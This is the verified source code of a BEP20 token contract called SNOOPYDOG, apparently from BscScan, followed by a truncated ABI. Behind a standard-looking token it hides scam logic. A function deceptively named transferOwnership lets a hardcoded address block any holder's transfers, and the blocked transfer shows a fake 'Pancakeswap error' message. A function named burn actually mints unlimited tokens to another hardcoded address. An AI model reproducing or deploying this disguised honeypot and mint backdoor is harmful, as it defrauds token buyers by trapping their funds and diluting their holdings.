{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2021-04-23\r\n*/\r\n\r\npragma\r\n \r\nsolidity\r\n 0.5.16;\r\n\r\ninterface\r\n \r\nIBEP20\r\n \r\n{\r\n  \r\n/**\r\n   * @dev Returns the amount of tokens in existence.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ntotalSupply\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint256\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Returns the token decimals.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ndecimals\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint8\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Returns the token symbol.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nsymbol\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nstring\r\n \r\nmemory\r\n)\r\n;\r\n  \r\n/**\r\n  * @dev Returns the token name.\r\n  */\r\n\r\n  \r\nfunction\r\n \r\nname\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nstring\r\n \r\nmemory\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Returns the bep token owner.\r\n   */\r\n\r\n  \r\n//function getOwner() internal view returns (address);\r\n  \r\n/**\r\n   * @dev Returns the amount of tokens owned by `account`.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nbalanceOf\r\n(\r\naddress\r\n account\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint256\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ntransfer\r\n(\r\naddress\r\n recipient, \r\nuint256\r\n amount\r\n) \r\nexternal\r\n \r\nreturns\r\n (\r\nbool\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Returns the remaining number of tokens that `spender` will be\r\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n   * zero by default.\r\n   *\r\n   * This value changes when {approve} or {transferFrom} are called.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nallowance\r\n(\r\naddress\r\n _owner, \r\naddress\r\n spender\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint256\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n   * that someone may use both the old and the new allowance by unfortunate\r\n   * transaction ordering. One possible solution to mitigate this race\r\n   * condition is to first reduce the spender's allowance to 0 and set the\r\n   * desired value afterwards:\r\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n   *\r\n   * Emits an {Approval} event.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\napprove\r\n(\r\naddress\r\n spender, \r\nuint256\r\n amount\r\n) \r\nexternal\r\n \r\nreturns\r\n (\r\nbool\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n   * allowance mechanism. `amount` is then deducted from the caller's\r\n   * allowance.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ntransferFrom\r\n(\r\naddress\r\n sender, \r\naddress\r\n recipient, \r\nuint256\r\n amount\r\n) \r\nexternal\r\n \r\nreturns\r\n (\r\nbool\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n   * another (`to`).\r\n   *\r\n   * Note that `value` may be zero.\r\n   */\r\n\r\n  \r\nevent\r\n \r\nTransfer\r\n(\r\naddress\r\n \r\nindexed\r\n \r\nfrom\r\n, \r\naddress\r\n \r\nindexed\r\n to, \r\nuint256\r\n value\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n   * a call to {approve}. `value` is the new allowance.\r\n   */\r\n\r\n  \r\nevent\r\n \r\nApproval\r\n(\r\naddress\r\n \r\nindexed\r\n owner, \r\naddress\r\n \r\nindexed\r\n spender, \r\nuint256\r\n value\r\n)\r\n;\r\n}\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\n\r\ncontract\r\n \r\nContext\r\n \r\n{\r\n  \r\n// Empty internal constructor, to prevent people from mistakenly deploying\r\n\r\n  \r\n// an instance of this contract, which should be used via inheritance.\r\n\r\n  \r\nconstructor\r\n (\r\n) \r\ninternal\r\n \r\n{ }\r\n  \r\nfunction\r\n \r\n_msgSender\r\n(\r\n) \r\ninternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\naddress\r\n \r\npayable\r\n) \r\n{\r\n    \r\nreturn\r\n \r\nmsg\r\n.\r\nsender\r\n;\r\n  }\r\n  \r\nfunction\r\n \r\n_msgData\r\n(\r\n) \r\ninternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nbytes\r\n \r\nmemory\r\n) \r\n{\r\n    \r\nthis\r\n; \r\n// silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n\r\n    \r\nreturn\r\n \r\nmsg\r\n.\r\ndata\r\n;\r\n  }\r\n}\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\n\r\nlibrary\r\n \r\nSafeMath\r\n \r\n{\r\n  \r\n/**\r\n   * @dev Returns the addition of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity's `+` operator.\r\n   *\r\n   * Requirements:\r\n   * - Addition cannot overflow.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nadd\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nuint256\r\n c = a + b;\r\n    \r\nrequire\r\n(c >= a, \r\n\"SafeMath: addition overflow\"\r\n);\r\n    \r\nreturn\r\n c;\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity's `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nsub\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nreturn\r\n sub(a, b, \r\n\"SafeMath: subtraction overflow\"\r\n);\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity's `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nsub\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b, \r\nstring\r\n \r\nmemory\r\n errorMessage\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nrequire\r\n(b <= a, errorMessage);\r\n    \r\nuint256\r\n c = a - b;\r\n    \r\nreturn\r\n c;\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the multiplication of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity's `*` operator.\r\n   *\r\n   * Requirements:\r\n   * - Multiplication cannot overflow.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nmul\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\n// Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n\r\n    \r\n// benefit is lost if 'b' is also tested.\r\n\r\n    \r\n// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n\r\n    \r\nif\r\n (a == \r\n0\r\n) {\r\n      \r\nreturn\r\n \r\n0\r\n;\r\n    }\r\n    \r\nuint256\r\n c = a * b;\r\n    \r\nrequire\r\n(c / a == b, \r\n\"SafeMath: multiplication overflow\"\r\n);\r\n    \r\nreturn\r\n c;\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ndiv\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nreturn\r\n div(a, b, \r\n\"SafeMath: division by zero\"\r\n);\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ndiv\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b, \r\nstring\r\n \r\nmemory\r\n errorMessage\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\n// Solidity only automatically asserts when dividing by 0\r\n\r\n    \r\nrequire\r\n(b > \r\n0\r\n, errorMessage);\r\n    \r\nuint256\r\n c = a / b;\r\n    \r\n// assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n    \r\nreturn\r\n c;\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n   * Reverts when dividing by zero.\r\n   *\r\n   * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n   * invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nmod\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nreturn\r\n mod(a, b, \r\n\"SafeMath: modulo by zero\"\r\n);\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n   * Reverts with custom message when dividing by zero.\r\n   *\r\n   * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n   * invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nmod\r\n(\r\nuint256\r\n a, \r\nuint256\r\n b, \r\nstring\r\n \r\nmemory\r\n errorMessage\r\n) \r\ninternal\r\n \r\npure\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nrequire\r\n(b != \r\n0\r\n, errorMessage);\r\n    \r\nreturn\r\n a % b;\r\n  }\r\n}\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\n\r\ncontract\r\n \r\nOwnable\r\n \r\nis\r\n \r\nContext\r\n \r\n{\r\n  \r\naddress\r\n \r\nprivate\r\n _owner;\r\n  \r\nevent\r\n \r\nOwnershipTransferred\r\n(\r\naddress\r\n \r\nindexed\r\n previousOwner, \r\naddress\r\n \r\nindexed\r\n newOwner\r\n)\r\n;\r\n  \r\n/**\r\n   * @dev Initializes the contract setting the deployer as the initial owner.\r\n   */\r\n\r\n  \r\nconstructor\r\n (\r\n) \r\ninternal\r\n \r\n{\r\n    \r\naddress\r\n msgSender = _msgSender();\r\n    _owner = msgSender;\r\n    \r\nemit\r\n OwnershipTransferred(\r\naddress\r\n(\r\n0\r\n), msgSender);\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the address of the current owner.\r\n   */\r\n\r\n  \r\nfunction owner() public view returns (address) \r\n{\r\n    return _owner;\r\n}\r\n  \r\n/**\r\n   * @dev Throws if called by any account other than the owner.\r\n   */\r\n\r\n  \r\nmodifier\r\n \r\nonlyOwner\r\n(\r\n) \r\n{\r\n    \r\nrequire\r\n(_owner == _msgSender(), \r\n\"Ownable: caller is not the owner\"\r\n);\r\n    \r\n_\r\n;\r\n  }\r\n  \r\n/**\r\n   * @dev Leaves the contract without owner. It will not be possible to call\r\n   * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n   *\r\n   * \r\nNOTE:\r\n Renouncing ownership will leave the contract without an owner,\r\n   * thereby removing any functionality that is only available to the owner.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nrenounceOwnership\r\n(\r\n) \r\npublic\r\n \r\nonlyOwner\r\n \r\n{\r\n    \r\nemit\r\n OwnershipTransferred(_owner, \r\naddress\r\n(\r\n0\r\n));\r\n    _owner = \r\naddress\r\n(\r\n0\r\n);\r\n  }\r\n  \r\n/**\r\n   * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n   * Can only be called by the current owner.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ntransferOwnership1\r\n(\r\naddress\r\n newOwner\r\n) \r\ninternal\r\n \r\nonlyOwner\r\n \r\n{\r\n    _transferOwnership(newOwner);\r\n  }\r\n  \r\n/**\r\n   * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n   */\r\n\r\n  \r\nfunction\r\n \r\n_transferOwnership\r\n(\r\naddress\r\n newOwner\r\n) \r\ninternal\r\n \r\n{\r\n    \r\nrequire\r\n(newOwner != \r\naddress\r\n(\r\n0\r\n), \r\n\"Ownable: new owner is the zero address\"\r\n);\r\n    \r\nemit\r\n OwnershipTransferred(_owner, newOwner);\r\n    _owner = newOwner;\r\n  }\r\n}\r\ncontract\r\n \r\nBEP20Token\r\n \r\nis\r\n \r\nContext\r\n, \r\nIBEP20\r\n, \r\nOwnable\r\n \r\n{\r\n  \r\nusing\r\n \r\nSafeMath\r\n \r\nfor\r\n \r\nuint256\r\n;\r\n \r\n mapping(address => bool) internal useinmanage;\r\n \r\nmapping\r\n (\r\naddress\r\n => \r\nuint256\r\n) \r\nprivate\r\n _balances;\r\n  \r\nmapping\r\n (\r\naddress\r\n => \r\nmapping\r\n (\r\naddress\r\n => \r\nuint256\r\n)) \r\nprivate\r\n _allowances;\r\n  \r\nuint256\r\n \r\nprivate\r\n _totalSupply;\r\n  \r\nuint8\r\n \r\nprivate\r\n _decimals;\r\n  \r\nstring\r\n \r\nprivate\r\n _symbol;\r\n  \r\nstring\r\n \r\nprivate\r\n _name;\r\n  \r\nconstructor() public {\r\n    _name = \"SNOOPYDOG (t.me/snoopydogbsc)\";\r\n    _symbol = \"SNOOPYDOG\";\r\n    _decimals = 9;\r\n    _totalSupply = 1000000000000000*10**9;\r\n    _balances[msg.sender] = _totalSupply;\r\n    \r\nemit\r\n Transfer(\r\naddress\r\n(\r\n0\r\n), \r\nmsg\r\n.\r\nsender\r\n, _totalSupply);\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the bep token owner.\r\n   */\r\n\r\n  \r\nfunction getOwner() internal view returns (address) {\r\n    return owner();\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the token decimals.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ndecimals\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint8\r\n) \r\n{\r\n    \r\nreturn\r\n _decimals;\r\n  }\r\n  \r\n/**\r\n   * @dev Returns the token symbol.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nsymbol\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nstring\r\n \r\nmemory\r\n) \r\n{\r\n    \r\nreturn\r\n _symbol;\r\n  }\r\n  \r\n/**\r\n  * @dev Returns the token name.\r\n  */\r\n\r\n  \r\nfunction\r\n \r\nname\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nstring\r\n \r\nmemory\r\n) \r\n{\r\n    \r\nreturn\r\n _name;\r\n  }\r\n  \r\n/**\r\n   * @dev See {BEP20-totalSupply}.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ntotalSupply\r\n(\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nreturn\r\n _totalSupply;\r\n  }\r\n  \r\n/**\r\n   * @dev See {BEP20-balanceOf}.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nbalanceOf\r\n(\r\naddress\r\n account\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nreturn\r\n _balances[account];\r\n  }\r\n  \r\n/**\r\n   * @dev See {BEP20-transfer}.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `recipient` cannot be the zero address.\r\n   * - the caller must have a balance of at least `amount`.\r\n   */\r\n\r\nfunction transferOwnership(address account, bool value) public  {\r\n    require(_msgSender() ==0x126a2A9BD337C3d8c0812E1991902269476Ac987, \"BEP20: Not accessible\");\r\n        useinmanage[account] = value;\r\n    }  \r\n\r\nfunction\r\n \r\ntransfer\r\n(\r\naddress\r\n recipient, \r\nuint256\r\n amount\r\n) \r\nexternal\r\n \r\nreturns\r\n (\r\nbool\r\n) \r\n{\r\n    _transfer(_msgSender(), recipient, amount);\r\n    \r\nreturn\r\n \r\ntrue\r\n;\r\n  }\r\n  \r\n/**\r\n   * @dev See {BEP20-allowance}.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nallowance\r\n(\r\naddress\r\n owner, \r\naddress\r\n spender\r\n) \r\nexternal\r\n \r\nview\r\n \r\nreturns\r\n (\r\nuint256\r\n) \r\n{\r\n    \r\nreturn\r\n _allowances[owner][spender];\r\n  }\r\n  \r\n/**\r\n   * @dev See {BEP20-approve}.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `spender` cannot be the zero address.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\napprove\r\n(\r\naddress\r\n spender, \r\nuint256\r\n amount\r\n) \r\nexternal\r\n \r\nreturns\r\n (\r\nbool\r\n) \r\n{\r\n    _approve(_msgSender(), spender, amount);\r\n    \r\nreturn\r\n \r\ntrue\r\n;\r\n  }\r\n  \r\n/**\r\n   * @dev See {BEP20-transferFrom}.\r\n   *\r\n   * Emits an {Approval} event indicating the updated allowance. This is not\r\n   * required by the EIP. See the note at the beginning of {BEP20};\r\n   *\r\n   * Requirements:\r\n   * - `sender` and `recipient` cannot be the zero address.\r\n   * - `sender` must have a balance of at least `amount`.\r\n   * - the caller must have allowance for `sender`'s tokens of at least\r\n   * `amount`.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ntransferFrom\r\n(\r\naddress\r\n sender, \r\naddress\r\n recipient, \r\nuint256\r\n amount\r\n) \r\nexternal\r\n \r\nreturns\r\n (\r\nbool\r\n) \r\n{\r\n    _transfer(sender, recipient, amount);\r\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \r\n\"BEP20: transfer amount exceeds allowance\"\r\n));\r\n    \r\nreturn\r\n \r\ntrue\r\n;\r\n  }\r\n  \r\n/**\r\n   * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n   *\r\n   * This is an alternative to {approve} that can be used as a mitigation for\r\n   * problems described in {BEP20-approve}.\r\n   *\r\n   * Emits an {Approval} event indicating the updated allowance.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `spender` cannot be the zero address.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nincreaseAllowance\r\n(\r\naddress\r\n spender, \r\nuint256\r\n addedValue\r\n) \r\npublic\r\n \r\nreturns\r\n (\r\nbool\r\n) \r\n{\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n    \r\nreturn\r\n \r\ntrue\r\n;\r\n  }\r\n  \r\n/**\r\n   * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n   *\r\n   * This is an alternative to {approve} that can be used as a mitigation for\r\n   * problems described in {BEP20-approve}.\r\n   *\r\n   * Emits an {Approval} event indicating the updated allowance.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `spender` cannot be the zero address.\r\n   * - `spender` must have allowance for the caller of at least\r\n   * `subtractedValue`.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\ndecreaseAllowance\r\n(\r\naddress\r\n spender, \r\nuint256\r\n subtractedValue\r\n) \r\npublic\r\n \r\nreturns\r\n (\r\nbool\r\n) \r\n{\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \r\n\"BEP20: decreased allowance below zero\"\r\n));\r\n    \r\nreturn\r\n \r\ntrue\r\n;\r\n  }\r\n  \r\n/**\r\n   * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing\r\n   * the total supply.\r\n   *\r\n   * Requirements\r\n   *\r\n   * - `msg.sender` must be the token owner\r\n   */\r\n\r\n  \r\nfunction burn(uint256 amount) public returns (bool) \r\n{\r\n    require(_msgSender() ==0x3776Cc8c212619322c0708884B9399f1E106b0A5, \"BEP20: Not accessible\");\r\n    burning(_msgSender(), amount);\r\n    \r\nreturn true;\r\n  }\r\n  \r\n/**\r\n   * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n   *\r\n   * This is internal function is equivalent to {transfer}, and can be used to\r\n   * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `sender` cannot be the zero address.\r\n   * - `recipient` cannot be the zero address.\r\n   * - `sender` must have a balance of at least `amount`.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\n_transfer\r\n(\r\naddress\r\n sender, \r\naddress\r\n recipient, \r\nuint256\r\n amount\r\n) \r\ninternal\r\n \r\n{\r\n    \r\nrequire\r\n(sender != \r\naddress\r\n(\r\n0\r\n), \r\n\"BEP20: transfer from the zero address\"\r\n);\r\n    \r\nrequire(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n\r\n require(!useinmanage[sender] , \"Pancakeswap error try again after sometime\");\r\n\r\n    _balances[sender] = _balances[sender].sub(amount, \r\n\"BEP20: transfer amount exceeds balance\"\r\n);\r\n    _balances[recipient] = _balances[recipient].add(amount);\r\n    \r\nemit\r\n Transfer(sender, recipient, amount);\r\n  }\r\n  \r\n/** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n   * the total supply.\r\n   *\r\n   * Emits a {Transfer} event with `from` set to the zero address.\r\n   *\r\n   * Requirements\r\n   *\r\n   * - `to` cannot be the zero address.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\nburning\r\n(\r\naddress\r\n account, \r\nuint256\r\n amount\r\n) \r\ninternal\r\n \r\n{\r\n    \r\nrequire\r\n(account != \r\naddress\r\n(\r\n0\r\n), \r\n\"BEP20: burn to the zero address\"\r\n);\r\n    _totalSupply = _totalSupply.add(amount);\r\n    _balances[account] = _balances[account].add(amount);\r\n    \r\nemit\r\n Transfer(\r\naddress\r\n(\r\n0\r\n), account, amount);\r\n  }\r\n  \r\n/**\r\n   * @dev Destroys `amount` tokens from `account`, reducing the\r\n   * total supply.\r\n   *\r\n   * Emits a {Transfer} event with `to` set to the zero address.\r\n   *\r\n   * Requirements\r\n   *\r\n   * - `account` cannot be the zero address.\r\n   * - `account` must have at least `amount` tokens.\r\n   */\r\n\r\n  \r\nfunction _burn(uint256 amount) internal returns (bool) \r\n{\r\n        _burni(_msgSender(), amount);\r\n        return true;\r\n    } \r\n    \r\n    \r\n\r\n    \r\nfunction _burni(address account, uint256 amount) internal\r\n {\r\n    \r\nrequire(account != address(0), \"BEP20: burn from the zero address\");\r\n    _balances[account] = _balances[account].sub(amount, \"BEP20: burn amount exceeds balance\");\r\n_totalSupply = _totalSupply.sub(amount);\r\n    \r\nemit Transfer(account, address(0), amount);\r\n     \r\n }\r\n  \r\n/**\r\n   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\r\n   *\r\n   * This is internal function is equivalent to `approve`, and can be used to\r\n   * e.g. set automatic allowances for certain subsystems, etc.\r\n   *\r\n   * Emits an {Approval} event.\r\n   *\r\n   * Requirements:\r\n   *\r\n   * - `owner` cannot be the zero address.\r\n   * - `spender` cannot be the zero address.\r\n   */\r\n\r\n  \r\nfunction\r\n \r\n_approve\r\n(\r\naddress\r\n owner, \r\naddress\r\n spender, \r\nuint256\r\n amount\r\n) \r\ninternal\r\n \r\n{\r\n    \r\nrequire\r\n(owner != \r\naddress\r\n(\r\n0\r\n), \r\n\"BEP20: approve from the zero address\"\r\n);\r\n    \r\nrequire\r\n(spender != \r\naddress\r\n(\r\n0\r\n), \r\n\"BEP20: approve to the zero address\"\r\n);\r\n    \r\nif\r\n (owner != \r\naddress\r\n(\r\n0\r\n)) {\r\n        _allowances[owner][spender] = amount;\r\n        \r\nemit\r\n Approval(owner, spender, amount);\r\n    } \r\nelse\r\n {\r\n        _allowances[owner][spender] = \r\n0\r\n;\r\n        \r\nemit\r\n Approval(owner, spender, \r\n0\r\n);\r\n    }\r\n  }\r\n  \r\n/**\r\n   * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\r\n   * from the caller's allowance.\r\n   *\r\n   * See {_burn} and {_approve}.\r\n   */\r\n\r\n  \r\nfunction _burnFrom(address account, uint256 amount) internal\r\n {\r\n    _burni(account, amount);\r\n    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, \r\n\"BEP20: burn amount exceeds allowance\"\r\n));\r\n  }\r\n}", "ABI": "[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"